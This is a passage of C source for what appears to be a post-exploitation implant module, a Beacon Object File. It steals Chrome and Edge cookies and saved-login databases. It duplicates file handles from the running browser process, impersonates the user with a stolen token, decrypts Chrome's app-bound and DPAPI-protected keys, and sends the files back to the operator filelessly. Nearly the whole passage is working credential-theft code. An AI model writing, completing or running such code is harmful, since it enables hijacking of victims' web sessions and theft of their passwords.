        if (!passwordStatus && loginData) {
            BeaconPrintf(CALLBACK_ERROR, "[!] Failed to locate login data for %s", browser);
        }
    }
    KERNEL32$CloseHandle(hSnap);
    //check if process was running
    if (processCount == 0) {
        //check if file exists
        BeaconPrintf(CALLBACK_OUTPUT,"[!] %s not found running on host -> Downloading cookies directly from %s \n", browser, cookieDB);
        DWORD data_size = 0;
        CHAR *data = GetFileContent(cookiePath, &data_size);
        if(data == NULL) {
            BeaconPrintf(CALLBACK_ERROR,"%s COOKIES not found on host\n", browser);
            goto ret;
        }
        // if copy folder is not null, then copy to folder instead of download_file()
        if (MSVCRT$strcmp(folderPath, "") != 0){
            CHAR cookieFilePath[MAX_PATH];
            MSVCRT$sprintf(cookieFilePath, "%s\\%s", folderPath, cookieDB);
            HANDLE hFile = KERNEL32$CreateFileA(cookieFilePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

            if (hFile == INVALID_HANDLE_VALUE) {
                BeaconPrintf(CALLBACK_ERROR, "Failed to write cookie file to %s\n", cookieFilePath);
            } else {
                DWORD written = 0;
                if (!KERNEL32$WriteFile(hFile, data, data_size, &written, NULL)) {
                    BeaconPrintf(CALLBACK_ERROR, "[!] WriteFile failed: %lu\n", KERNEL32$GetLastError());
                    KERNEL32$CloseHandle(hFile);
                    goto ret;
                }
                if (written != data_size) {
                    BeaconPrintf(CALLBACK_ERROR, "[!] Wrote %lu bytes, expected %lu\n", written, data_size);
                }

                BeaconPrintf(CALLBACK_OUTPUT, "Wrote cookie file to: %s\n", cookieFilePath);
                KERNEL32$CloseHandle(hFile);
            }

        } else {
            download_file(cookieDB, data, data_size);
        }
        //download_file(cookieDB,data, sizeof(data));
        KERNEL32$GlobalFree(data);
        data_size = 0;
        CHAR *passwordData = GetFileContent(passwordPath, &data_size);
        if(passwordData == NULL) {
            BeaconPrintf(CALLBACK_ERROR,"%s LOGIN DATA not found on host\n", browser);
            goto ret;
        }
        // if copy folder is not null, then copy to folder instead of download_file()
        if (MSVCRT$strcmp(folderPath, "") != 0){
            CHAR passwordFilePath[MAX_PATH];
            MSVCRT$sprintf(passwordFilePath, "%s\\%s", folderPath, passwordDB);
            HANDLE hFile = KERNEL32$CreateFileA(passwordFilePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

            if (hFile == INVALID_HANDLE_VALUE) {
                BeaconPrintf(CALLBACK_ERROR, "Failed to write password file to %s\n", passwordFilePath);
            } else {
                DWORD written = 0;
                if (!KERNEL32$WriteFile(hFile, passwordData, data_size, &written, NULL)) {
                    BeaconPrintf(CALLBACK_ERROR, "[!] WriteFile failed: %lu\n", KERNEL32$GetLastError());
                    KERNEL32$CloseHandle(hFile);
                    goto ret;
                }
                if (written != data_size) {
                    BeaconPrintf(CALLBACK_ERROR, "[!] Wrote %lu bytes, expected %lu\n", written, data_size);
                }

                BeaconPrintf(CALLBACK_OUTPUT, "Wrote password file to: %s\n", passwordFilePath);
                KERNEL32$CloseHandle(hFile);
            }
        } else {
            download_file(passwordDB,passwordData, data_size);
        }
        KERNEL32$GlobalFree(passwordData);
    }
ret:
    BeaconPrintf(CALLBACK_OUTPUT, "==============================\n");
}

BOOL GetBrowserFile(DWORD PID, CHAR *browserFile, CHAR *downloadFileName, CHAR * folderPath) {
    //BeaconPrintf(CALLBACK_OUTPUT,"Browser PID found %d\n", PID);
    //BeaconPrintf(CALLBACK_OUTPUT,"Searching for handle to %s \n", browserFile);

    SYSTEM_HANDLE_INFORMATION_EX *shi = NULL;
    DWORD dwNeeded = 0;
    DWORD dwSize = 0xffffff / 2;
    BOOL result = FALSE;

    // outside declaration
    POBJECT_NAME_INFORMATION objectNameInfo = NULL;
    PPUBLIC_OBJECT_TYPE_INFORMATION objectTypeInfo = NULL;
    HANDLE hDuplicate = NULL;
    HANDLE hProc = NULL;
    CHAR *buffer = NULL;

    shi = (SYSTEM_HANDLE_INFORMATION_EX *)KERNEL32$GlobalAlloc(GPTR, dwSize);
    if (!shi) {
        BeaconPrintf(CALLBACK_ERROR, "GlobalAlloc failed for handle information.\n");
        return FALSE;
    }

    //utilize NtQueryStemInformation to list all handles on system
    NTSTATUS status = NTDLL$NtQuerySystemInformation(SystemHandleInformationEx, shi, dwSize, &dwNeeded);
    if(status == STATUS_INFO_LENGTH_MISMATCH)
    {
        dwSize = dwNeeded;
        SYSTEM_HANDLE_INFORMATION_EX *shi_new = (SYSTEM_HANDLE_INFORMATION_EX*) KERNEL32$GlobalReAlloc(shi, dwSize, GMEM_MOVEABLE);

        if (shi_new == NULL) {
            BeaconPrintf(CALLBACK_ERROR, "Failed to reallocate memory...\n");
            KERNEL32$GlobalFree(shi);
            return FALSE;
        }
        shi = shi_new;
    }
    status = NTDLL$NtQuerySystemInformation(SystemHandleInformationEx, shi, dwSize, &dwNeeded);
    if(status != 0)
    {
        BeaconPrintf(CALLBACK_ERROR,"NtQuerySystemInformation failed with status 0x%x.\n",status);
        KERNEL32$GlobalFree(shi);
        return FALSE;
    }
    //BeaconPrintf(CALLBACK_OUTPUT,"Handle Count %d\n", shi->NumberOfHandles);
    //iterate through each handle and find our PID and a handle to a file
    for(DWORD i = 0; i < shi->NumberOfHandles; i++) {
        SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX handle = shi->Handles[i];
        if ((DWORD)(ULONG_PTR)handle.UniqueProcessId != PID) {
            continue;
        }
        //BeaconPrintf(CALLBACK_OUTPUT, "Found PID");
        if (handle.GrantedAccess == 0x001a019f) continue;
        if (handle.HandleAttributes == 0x2 && handle.GrantedAccess == 0x0012019f) continue;

        // reset per every iteration
        if (objectNameInfo) { MSVCRT$free(objectNameInfo); objectNameInfo = NULL; }
        if (objectTypeInfo) { MSVCRT$free(objectTypeInfo); objectTypeInfo = NULL; }
        if (hDuplicate) { KERNEL32$CloseHandle(hDuplicate); hDuplicate = NULL; }
        if (hProc) { KERNEL32$CloseHandle(hProc); hProc = NULL; }
        if (buffer) { KERNEL32$GlobalFree(buffer); buffer = NULL; }

        objectNameInfo = (POBJECT_NAME_INFORMATION)MSVCRT$malloc(0x1000);
        objectTypeInfo = (PPUBLIC_OBJECT_TYPE_INFORMATION)MSVCRT$malloc(0x1000);
        if (!objectNameInfo || !objectTypeInfo) {
            BeaconPrintf(CALLBACK_ERROR, "malloc failed\n");
            if (objectNameInfo) MSVCRT$free(objectNameInfo);
            if (objectTypeInfo) MSVCRT$free(objectTypeInfo);
            continue;
        }

        hProc = KERNEL32$OpenProcess(PROCESS_DUP_HANDLE, FALSE, PID);
        if (hProc == INVALID_HANDLE_VALUE) {
            BeaconPrintf(CALLBACK_ERROR, "OpenProcess failed %d\n", KERNEL32$GetLastError());
            continue;
        }

        if (!KERNEL32$DuplicateHandle(hProc, (HANDLE)(intptr_t)handle.HandleValue, (HANDLE)-1, &hDuplicate, 0, FALSE, DUPLICATE_SAME_ACCESS)) {
            //BeaconPrintf(CALLBACK_ERROR,"DuplicateHandle failed %d\n", KERNEL32$GetLastError());
            continue;
        }

        //Check if the handle exists on disk, otherwise the program will hang
        if (KERNEL32$GetFileType(hDuplicate) != FILE_TYPE_DISK) {
            //BeaconPrintf(CALLBACK_ERROR, "NOT A FILE");
            continue;
        }

        ULONG returnLength = 0;
        //BeaconPrintf(CALLBACK_OUTPUT,"Duplicated Handle, confirmed file on disk");
        status = NTDLL$NtQueryObject(hDuplicate, ObjectNameInformation, objectNameInfo, 0x1000, &returnLength);
        if (status != 0) {
            BeaconPrintf(CALLBACK_ERROR,"Failed NtQueryObject");
            continue;
        }

        if (objectNameInfo->Name.Length == 0) {
            continue;
        }

        char handleName[1024];
        MSVCRT$sprintf(handleName, "%.*ws", objectNameInfo->Name.Length / sizeof(WCHAR), objectNameInfo->Name.Buffer);

        status = NTDLL$NtQueryObject(hDuplicate, ObjectTypeInformation, objectTypeInfo, 0x1000, &returnLength);
        if (status != 0) {

            BeaconPrintf(CALLBACK_ERROR,"Failed NtQueryObject");
            continue;
        }

        // extract type name properly
        UNICODE_STRING *typeStr = &objectTypeInfo->TypeName;
        WCHAR typeName[256] = {0};
        int len = min(typeStr->Length / sizeof(WCHAR), 255);
        MSVCRT$wcsncpy(typeName, typeStr->Buffer, len);
        typeName[len] = L'\0'; // null terminated

        if (MSVCRT$_wcsicmp(typeName, L"File") != 0) {
            continue;
        }
        //BeaconPrintf(CALLBACK_OUTPUT, "%s\n", handleName);
        //BeaconPrintf(CALLBACK_OUTPUT, "%d\n", MSVCRT$strlen(handleName));

        // Check filename
        if (MSVCRT$strstr(handleName, browserFile) != NULL) {
            size_t nameLen = MSVCRT$strlen(handleName);
            const char *ext7 = (nameLen >= 7) ? &handleName[nameLen - 7] : "";
            const char *ext4 = (nameLen >= 4) ? &handleName[nameLen - 4] : "";

            if (MSVCRT$strcmp(ext7, "Cookies") == 0 || MSVCRT$strcmp(ext4, "Data") == 0) {
                BeaconPrintf(CALLBACK_OUTPUT, "[+] Handle to %s Was FOUND with PID: %lu\n", browserFile, PID);
                //BeaconPrintf(CALLBACK_OUTPUT, "Handle Name: %.*ws\n", objectNameInfo->Name.Length / sizeof(WCHAR), objectNameInfo->Name.Buffer);

                KERNEL32$SetFilePointer(hDuplicate, 0, 0, FILE_BEGIN);
                DWORD dwFileSize = KERNEL32$GetFileSize(hDuplicate, NULL);
                BeaconPrintf(CALLBACK_OUTPUT, "[+] file size is %d\n", dwFileSize);

                buffer = (CHAR*)KERNEL32$GlobalAlloc(GPTR, dwFileSize);
                if (!buffer) {
                    BeaconPrintf(CALLBACK_ERROR, "Failed to allocate buffer\n");
                    continue;
                }

                DWORD dwRead = 0;
                // check if readfile failed
                if (!KERNEL32$ReadFile(hDuplicate, buffer, dwFileSize, &dwRead, NULL)) {
                    BeaconPrintf(CALLBACK_ERROR, "ReadFile failed\n");
                    KERNEL32$GlobalFree(buffer);
                    buffer = NULL;
                    continue;
                }

                //if folder path is not null, then copy to folder instead of download_file()
                if (MSVCRT$strcmp(folderPath, "") != 0) {
                    CHAR copyFilePath[MAX_PATH];
                    MSVCRT$sprintf(copyFilePath, "%s\\%s", folderPath, downloadFileName);
                    HANDLE hFile = KERNEL32$CreateFileA(copyFilePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

                    if (hFile != INVALID_HANDLE_VALUE) {
                        DWORD written = 0;
                        KERNEL32$WriteFile(hFile, buffer, dwFileSize, &written, NULL);
                        BeaconPrintf(CALLBACK_OUTPUT, "[+] Wrote password file to: %s\n", copyFilePath);
                        KERNEL32$CloseHandle(hFile);
                    } else {
                        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to write password file to %s\n", copyFilePath);
                    }
                } else {
                    download_file(downloadFileName, buffer, dwFileSize);
                }

                result = TRUE;
                goto cleanup_and_exit;
            }
        }
    }

cleanup_and_exit:
    //  clean up and free everything
    if (buffer) KERNEL32$GlobalFree(buffer);
    if (hDuplicate) KERNEL32$CloseHandle(hDuplicate);
    if (hProc) KERNEL32$CloseHandle(hProc);
    if (objectNameInfo) MSVCRT$free(objectNameInfo);
    if (objectTypeInfo) MSVCRT$free(objectTypeInfo);
    if (shi) KERNEL32$GlobalFree(shi);

    return result;
}

// nanodump fileless download
BOOL download_file( IN LPCSTR fileName, IN char fileData[], IN ULONG32 fileLength)
{
    AxDownloadMemory(fileName, fileData, fileLength);
    BeaconPrintf(CALLBACK_OUTPUT,"[+] The file was downloaded filessly");
    return TRUE;
}

// Helper functions for string operations - Chrome style
BOOL PopFromStringFront(BYTE** data, DWORD* data_len, DWORD pop_len, BYTE* output) {
    // Check if we have enough data
    if (*data_len < pop_len) {
        return FALSE;
    }

    // Copy the data if output buffer is provided
    if (output != NULL) {
        MSVCRT$memcpy(output, *data, pop_len);
    }

    // Move the pointer forward
    *data += pop_len;
    *data_len -= pop_len;

    return TRUE;
}

BOOL PopDWORDFromStringFront(BYTE** data, DWORD* data_len, DWORD* output) {
    if (*data_len < sizeof(DWORD)) {
        return FALSE;
    }

    if (output != NULL) {
        *output = *((DWORD*)*data);
    }

    *data += sizeof(DWORD);
    *data_len -= sizeof(DWORD);

    return TRUE;
}

BYTE* decrypt_with_cng(const BYTE* input_data, DWORD input_size, DWORD* output_size) {
    NCRYPT_PROV_HANDLE hProvider = 0;
    NCRYPT_KEY_HANDLE hKey = 0;
    BYTE* output_buffer = NULL;
    DWORD buffer_size = 0;
    SECURITY_STATUS status;

    // Initialize output size
    *output_size = 0;

    // Open storage provider
    LPCWSTR provider_name = L"Microsoft Software Key Storage Provider";
    status = NCRYPT$NCryptOpenStorageProvider(&hProvider, provider_name, 0);
    if (status != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR,"[!] NCryptOpenStorageProvider failed with status 0x%08X\n", status);
        return NULL;
    }

    // Open key
    LPCWSTR key_name = L"Google Chromekey1";
    status = NCRYPT$NCryptOpenKey(hProvider, &hKey, key_name, 0, 0);
    if (status != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR,"[!] NCryptOpenKey failed with status 0x%08X\n", status);
        NCRYPT$NCryptFreeObject(hProvider);
        return NULL;
    }

    // First call to get required buffer size
    status = NCRYPT$NCryptDecrypt(
        hKey,
        (PBYTE)input_data,
        input_size,
        NULL,                    // pPaddingInfo
        NULL,                    // pbOutput (NULL to get size)
        0,                       // cbOutput
        &buffer_size,            // pcbResult
        NCRYPT_SILENT_FLAG       // dwFlags (0x40)
    );

    if (status != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR,"[!] 1st NCryptDecrypt failed with status 0x%08X\n", status);
        NCRYPT$NCryptFreeObject(hKey);
        NCRYPT$NCryptFreeObject(hProvider);
        return NULL;
    }

    // Allocate output buffer
    output_buffer = (BYTE*)MSVCRT$malloc(buffer_size);
    if (!output_buffer) {
        BeaconPrintf(CALLBACK_ERROR,"[!] Memory allocation failed\n");
        NCRYPT$NCryptFreeObject(hKey);
        NCRYPT$NCryptFreeObject(hProvider);
        return NULL;
    }

    // Second call to actually decrypt
    status = NCRYPT$NCryptDecrypt(
        hKey,
        (PBYTE)input_data,
        input_size,
        NULL,                    // pPaddingInfo
        output_buffer,           // pbOutput
        buffer_size,             // cbOutput
        &buffer_size,            // pcbResult (actual bytes written)
        NCRYPT_SILENT_FLAG       // dwFlags (0x40)
    );

    if (status != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR,"[!] 2nd NCryptDecrypt failed with status 0x%08X\n", status);
        MSVCRT$free(output_buffer);
        output_buffer = NULL;
        buffer_size = 0;
    }

    // Clean up
    NCRYPT$NCryptFreeObject(hKey);
    NCRYPT$NCryptFreeObject(hProvider);

    // Set output size
    *output_size = buffer_size;

    return output_buffer;
}

// Steal Token and impersonate user.
BOOL StealAndImpersonate(int pid) {
    HANDLE hProcess, hToken, hUser;
    hProcess = KERNEL32$OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (hProcess == NULL) {
        BeaconPrintf(CALLBACK_ERROR,"[!] Failed to open process: %lu\n", KERNEL32$GetLastError());
        return FALSE;
    }

    if (!ADVAPI32$OpenProcessToken(hProcess, TOKEN_QUERY | TOKEN_DUPLICATE, &hToken)) {
        BeaconPrintf(CALLBACK_ERROR,"[!] Failed to open process token: %lu\n", KERNEL32$GetLastError());
        KERNEL32$CloseHandle(hProcess);
        return FALSE;
    }

    if (!ADVAPI32$DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS,NULL, SecurityImpersonation, TokenPrimary, &hUser)) {
        BeaconPrintf(CALLBACK_ERROR,"[!] Failed to duplicate token: %lu\n", KERNEL32$GetLastError());
        KERNEL32$CloseHandle(hToken);
        KERNEL32$CloseHandle(hProcess);
        return FALSE;
    }

    if (!ADVAPI32$ImpersonateLoggedOnUser(hUser)) {
        BeaconPrintf(CALLBACK_ERROR,"[!] Failed to impersonate user: %lu\n", KERNEL32$GetLastError());
        KERNEL32$CloseHandle(hToken);
        KERNEL32$CloseHandle(hProcess);
        return FALSE;
    }

//    BeaconPrintf(CALLBACK_OUTPUT,"[+] Successfully impersonated user with PID: %d\n", pid);
    return TRUE;
}

BOOL AppBoundDecryptor(char * localStateFile, int pid){
    //BeaconPrintf(CALLBACK_OUTPUT, "Got Local State File");
    // extract CHAR pattern[] = "\"encrypted_key\":\""; from file
    DWORD app_data_size = 0;
    char* app_data = GetFileContent(localStateFile, &app_data_size);
    if(app_data == NULL) {
        BeaconPrintf(CALLBACK_ERROR,"[!] Reading the file failed.\n");
        return FALSE;
    }
    CHAR pattern[] = "\"encrypted_key\":\"";
    char* v10_key = ExtractKey(app_data, pattern);

    CHAR app_pattern[] =  "\"app_bound_encrypted_key\":\"";
    char* app_key = ExtractKey(app_data, app_pattern);

//    BeaconPrintf(CALLBACK_OUTPUT,"[+] Extracted Encrypted Key %s\n", v10_key);
//    BeaconPrintf(CALLBACK_OUTPUT,"[+] Extracted Encrypt Appboundkey %s\n", app_key);

    if (v10_key != NULL) {
        // Decrypt V10 Encryption Key
        // todo store token
        if (StealAndImpersonate(pid)) {
            GetMasterKey(v10_key);
            ADVAPI32$RevertToSelf();
        } else {
            return FALSE;
        }
    }

    if (app_key == NULL) {
        BeaconPrintf(CALLBACK_ERROR,"[!] Error Encrypt Appboundkey is null\n");
        return FALSE;
    }

    // Base64 decode the app_bound_encrypted_key
    size_t encrypted_key_len;
    uint8_t* encrypted_key_with_header = Base64Decode(app_key, &encrypted_key_len);
    if (encrypted_key_with_header == NULL) {
        BeaconPrintf(CALLBACK_ERROR,"[!] Failed to base64 decode the key\n");
        KERNEL32$GlobalFree(app_data);
        KERNEL32$GlobalFree(app_key);
        return FALSE;
    }

    // Validate key prefix (APPB)
    if (encrypted_key_len < sizeof(kCryptAppBoundKeyPrefix) || MSVCRT$memcmp(encrypted_key_with_header, kCryptAppBoundKeyPrefix, sizeof(kCryptAppBoundKeyPrefix)) != 0) {
        BeaconPrintf(CALLBACK_ERROR,"[!] Invalid key header - expected 'APPB' prefix\n");
        MSVCRT$free(encrypted_key_with_header);
        KERNEL32$GlobalFree(app_data);
        KERNEL32$GlobalFree(app_key);
        return FALSE;
    }

    // Strip prefix
    uint8_t* encrypted_key = (uint8_t*)MSVCRT$malloc(encrypted_key_len - sizeof(kCryptAppBoundKeyPrefix));
    if (encrypted_key == NULL) {
        BeaconPrintf(CALLBACK_ERROR,"[!] Failed to allocate memory for encrypted key\n");
        MSVCRT$free(encrypted_key_with_header);
        KERNEL32$GlobalFree(app_data);
        KERNEL32$GlobalFree(app_key);
        return FALSE;
    }

    MSVCRT$memcpy(encrypted_key, encrypted_key_with_header + sizeof(kCryptAppBoundKeyPrefix), encrypted_key_len - sizeof(kCryptAppBoundKeyPrefix));
    encrypted_key_len -= sizeof(kCryptAppBoundKeyPrefix);
    MSVCRT$free(encrypted_key_with_header);

    // First, attempt to decrypt as SYSTEM
//    BeaconPrintf(CALLBACK_OUTPUT,"[+] Attempting to decrypt key as SYSTEM...\n");

    BYTE* decrypted_key = NULL;
    DWORD decrypted_key_len = 0;

    DATA_BLOB encrypted_blob;
    DATA_BLOB intermediate_blob;
    DATA_BLOB decrypted_blob;

    encrypted_blob.pbData = encrypted_key;
    encrypted_blob.cbData = encrypted_key_len;
    HANDLE hUser = NULL;
    HANDLE hToken = NULL;
    HANDLE hProcess = NULL;

    BOOL result = CRYPT32$CryptUnprotectData(&encrypted_blob, NULL, NULL, NULL, NULL, 0, &intermediate_blob);
    if (result) {
//        BeaconPrintf(CALLBACK_OUTPUT,"[+] Attempting to impersonate user to decrypt...\n");

        // Impersonate the user
        hProcess = KERNEL32$OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
        if (hProcess == NULL) {
            BeaconPrintf(CALLBACK_ERROR,"[!] Failed to open process: %lu\n", KERNEL32$GetLastError());
            MSVCRT$free(encrypted_key);
            KERNEL32$GlobalFree(app_data);
            KERNEL32$GlobalFree(app_key);
            return FALSE;
        }

        if (!ADVAPI32$OpenProcessToken(hProcess, TOKEN_QUERY | TOKEN_DUPLICATE, &hToken)) {
            BeaconPrintf(CALLBACK_ERROR,"[!] Failed to open process token: %lu\n", KERNEL32$GetLastError());
            KERNEL32$CloseHandle(hProcess);
            MSVCRT$free(encrypted_key);
            KERNEL32$GlobalFree(app_data);
            KERNEL32$GlobalFree(app_key);
            return FALSE;
        }

        if (!ADVAPI32$DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS,NULL, SecurityImpersonation, TokenPrimary, &hUser)) {
            BeaconPrintf(CALLBACK_ERROR,"[!] Failed to duplicate token: %lu\n", KERNEL32$GetLastError());
            KERNEL32$CloseHandle(hToken);
            KERNEL32$CloseHandle(hProcess);
            MSVCRT$free(encrypted_key);
            KERNEL32$GlobalFree(app_data);
            KERNEL32$GlobalFree(app_key);
            return FALSE;
        }

        // ToDo store token;
        if (!ADVAPI32$ImpersonateLoggedOnUser(hUser)) {
            BeaconPrintf(CALLBACK_ERROR,"[!] Failed to impersonate user: %lu\n", KERNEL32$GetLastError());
            KERNEL32$CloseHandle(hToken);
            KERNEL32$CloseHandle(hProcess);
            KERNEL32$CloseHandle(hUser);
            MSVCRT$free(encrypted_key);
            KERNEL32$GlobalFree(app_data);
            KERNEL32$GlobalFree(app_key);
            return FALSE;
        }

//        BeaconPrintf(CALLBACK_OUTPUT,"[!] Successfully impersonated user with PID: %d\n", pid);

        // Now try to decrypt as impersonated user
        result = CRYPT32$CryptUnprotectData(&intermediate_blob, NULL, NULL, NULL, NULL, 0, &decrypted_blob);
        if (!result) {
            BeaconPrintf(CALLBACK_ERROR,"[!] Decrypting as impersonated user failed: %lu\n", KERNEL32$GetLastError());
            ADVAPI32$RevertToSelf();
            KERNEL32$CloseHandle(hToken);
            KERNEL32$CloseHandle(hProcess);
            KERNEL32$CloseHandle(hUser);
            MSVCRT$free(encrypted_key);
            KERNEL32$GlobalFree(app_data);
            KERNEL32$GlobalFree(app_key);
            return FALSE;
        }

//        BeaconPrintf(CALLBACK_OUTPUT,"[!] Successfully decrypted key as impersonated user!\n");
    } else {
        BeaconPrintf(CALLBACK_ERROR,"[!] Failed to decrypt key as SYSTEM!\n");
        MSVCRT$free(encrypted_key);
        KERNEL32$GlobalFree(app_data);
        KERNEL32$GlobalFree(app_key);
        return FALSE;
    }

    // Revert impersonation
    if (hUser != NULL) {
        ADVAPI32$RevertToSelf();
        KERNEL32$CloseHandle(hToken);
        KERNEL32$CloseHandle(hProcess);
        KERNEL32$CloseHandle(hUser);
//        BeaconPrintf(CALLBACK_OUTPUT,"[+] Rev2Self\n");
    }

    // Parse the decrypted data - Chrome format
    BYTE* cursor = decrypted_blob.pbData;
    DWORD remaining = decrypted_blob.cbData;
    DWORD validation_len = 0;

    // Get validation string length
    if (!PopDWORDFromStringFront(&cursor, &remaining, &validation_len)) {
        BeaconPrintf(CALLBACK_ERROR,"[!] Failed to read validation length.\n");
        KERNEL32$LocalFree(decrypted_blob.pbData);
        MSVCRT$free(encrypted_key);
        KERNEL32$GlobalFree(app_data);
        KERNEL32$GlobalFree(app_key);
        return FALSE;
    }

    if (validation_len > remaining) {
        BeaconPrintf(CALLBACK_ERROR,"[!] Validation length (%lu) exceeds remaining data (%lu).\n", validation_len, remaining);
        KERNEL32$LocalFree(decrypted_blob.pbData);
        MSVCRT$free(encrypted_key);
        KERNEL32$GlobalFree(app_data);
        KERNEL32$GlobalFree(app_key);
        return FALSE;
    }

    // Get validation string
    BYTE* validation_blob = cursor;
    if (!PopFromStringFront(&cursor, &remaining, validation_len, NULL)) {
        BeaconPrintf(CALLBACK_ERROR,"[!] Failed to extract validation blob.\n");
        KERNEL32$LocalFree(decrypted_blob.pbData);
        MSVCRT$free(encrypted_key);
        KERNEL32$GlobalFree(app_data);
        KERNEL32$GlobalFree(app_key);
        return FALSE;
    }

    // Get key length
    DWORD key_len = 0;
    if (!PopDWORDFromStringFront(&cursor, &remaining, &key_len)) {
        BeaconPrintf(CALLBACK_ERROR,"[!] Failed to read key length.\n");
        KERNEL32$LocalFree(decrypted_blob.pbData);
        MSVCRT$free(encrypted_key);
        KERNEL32$GlobalFree(app_data);
        KERNEL32$GlobalFree(app_key);
        return FALSE;
    }

    if (key_len > remaining) {
        BeaconPrintf(CALLBACK_ERROR,"[!] Key length (%lu) exceeds remaining data (%lu).\n", key_len, remaining);
        KERNEL32$LocalFree(decrypted_blob.pbData);
        MSVCRT$free(encrypted_key);
        KERNEL32$GlobalFree(app_data);
        KERNEL32$GlobalFree(app_key);
        return FALSE;
    }

    // Get key blob
    BYTE* key_blob = cursor;

    // if first byte is 03 then decyrpt with CNG
    if (key_blob[0] == 0x03) {
//            BeaconPrintf(CALLBACK_OUTPUT,"[+] Decrypting key with CNG...");
        BYTE* aes_encrypted_key = key_blob + 1;
        DWORD cng_out_len = 0;
        BYTE *decrypted = decrypt_with_cng(aes_encrypted_key, 32, &cng_out_len);
        if (decrypted) {
            CHAR *chromeOutput = (CHAR*)KERNEL32$GlobalAlloc(GPTR, (cng_out_len * 4) + 1);
            if (!chromeOutput) {
                MSVCRT$free(decrypted);
                return FALSE;
            }

//          BeaconPrintf(CALLBACK_OUTPUT,"[+] CNG Decryption Output (%lu bytes):\n", cng_out_len);
            int offset = 0;
            for (DWORD i = 0; i < cng_out_len; i++) {
                int written = MSVCRT$_snprintf(chromeOutput + offset, (cng_out_len * 4) + 1 - offset, "\\x%02x", decrypted[i]);
                if (written < 0 || written >= (int)((cng_out_len * 4) + 1 - offset)) {
                    BeaconPrintf(CALLBACK_ERROR, "[!] Buffer overflow in hex encoding\n");
                    KERNEL32$GlobalFree(chromeOutput);
                    MSVCRT$free(decrypted);
                    return FALSE;
                }
                offset += written;
            }

            BeaconPrintf(CALLBACK_OUTPUT,"[+] -> Chrome AES Key: %s \n", chromeOutput);
            MSVCRT$free(decrypted);
            KERNEL32$GlobalFree(chromeOutput);
        } else {
            BeaconPrintf(CALLBACK_ERROR,"[!] CNG decryption failed.\n");
        }
    }
    CHAR *output = (CHAR*)KERNEL32$GlobalAlloc(GPTR, (key_len * 4) + 1);

    for (DWORD i = 0; i < key_len; i++) {
        MSVCRT$sprintf(output, "%s\\x%02x", output, key_blob[i]);
    }

    BeaconPrintf(CALLBACK_OUTPUT,"[+] -> Encrypted App Bound Key: %s \n", output );

    // Clean up
    KERNEL32$LocalFree(decrypted_blob.pbData);
    KERNEL32$LocalFree(intermediate_blob.pbData);
    MSVCRT$free(encrypted_key);
    KERNEL32$GlobalFree(app_data);
    KERNEL32$GlobalFree(app_key);
    KERNEL32$GlobalFree(output);

    return TRUE;
}

BOOL isBrowserSupported(char* browser) {
    for (int i = 0; i < sizeof(supported_browsers) / sizeof(supported_browsers[0]); i++) {
        if (MSVCRT$strcmp(browser, supported_browsers[i]) == 0) {
            return TRUE;
        }
    }
    return FALSE;
}

BOOL ConstructDbPath(char* dest, size_t dest_size, const char* browser, const char* type) {
    if (!dest || !browser || !type || dest_size < 1) {
        return FALSE;
    }
    int result = MSVCRT$_snprintf(dest, dest_size, "%s%s.db", browser, type);
    if (result < 0 || (size_t)result >= dest_size) {
        dest[dest_size - 1] = '\0';
        return FALSE;
    }
    return TRUE;
}

VOID go(char *buf, int len) {
    //parse command line arguements
    datap parser;
    char* browser = "";
    char* browser_path = "";
    char* copyFile = "";
    int browser_pid, cookie_pid, password_pid;
    BOOL cookies, passwords, keys;

    BeaconDataParse(&parser, buf, len);
    browser = BeaconDataExtract(&parser, NULL);
    browser_path = BeaconDataExtract(&parser, NULL);
    browser_pid = BeaconDataInt(&parser);
    cookies = BeaconDataInt(&parser);
    passwords = BeaconDataInt(&parser);
    keys = BeaconDataInt(&parser);
    cookie_pid = BeaconDataInt(&parser);
    password_pid = BeaconDataInt(&parser);
    BOOL AllBrowsers = FALSE;

    if (cookie_pid != 0 || password_pid != 0) {
        if (MSVCRT$strlen(browser) == 0) {
            BeaconPrintf(CALLBACK_ERROR, "[!] Please specify which browser to use (chrome or msedge)\n");
            return;
        }
        if (!isBrowserSupported(browser)) {
            BeaconPrintf(CALLBACK_ERROR, "[!] Browser %s is currently not supported, if its chromium based try browser path\n", browser);
            return;
        }
        char dbCookies[20];
        char dbPasswords[20];
        if (!ConstructDbPath(dbCookies, sizeof(dbCookies), browser, "Cookies") ||
            !ConstructDbPath(dbPasswords, sizeof(dbPasswords), browser, "Passwords")) {
            BeaconPrintf(CALLBACK_ERROR, "[!] Failed to construct database paths");
            return;
        }
        if (keys && passwords && cookies) {
            GetEncryptionKey(browser);
            GetBrowserFile(password_pid, "Login Data", dbPasswords, copyFile);
            GetBrowserFile(cookie_pid, "Cookies", dbCookies, copyFile);
            return;
        }
        //if cookie or login data only or keys, then get the cookies and/or passwords and exit
        if (keys){
            GetEncryptionKey(browser);
            return;
        } else if (passwords) {
            GetBrowserFile(password_pid, "Login Data", dbPasswords, copyFile);
            return;
        } else {
            GetBrowserFile(cookie_pid, "Cookies", dbCookies, copyFile);
            return;
        }
    }

    if (MSVCRT$strlen(browser) == 0) {
        if (browser_path != NULL && MSVCRT$strlen(browser_path) > 0) {
            if (browser_pid == 0) {
                BeaconPrintf(CALLBACK_ERROR, "[!] Browser Pid is require for Impersonation");
                return;
            }
            BeaconPrintf(CALLBACK_OUTPUT, "[+] Using browser path: %s and pid %d", browser_path, browser_pid);
            //if key only, then get the key and exit
            if (keys) {
                BeaconPrintf(CALLBACK_OUTPUT, "[+] KEY ONLY SELECTED");
                AppBoundDecryptor(browser_path, browser_pid);
                return;
            }

            char* browser = NULL;
            if (SHLWAPI$StrStrIA(browser_path, "chrome") != NULL) {
                browser = "chrome";
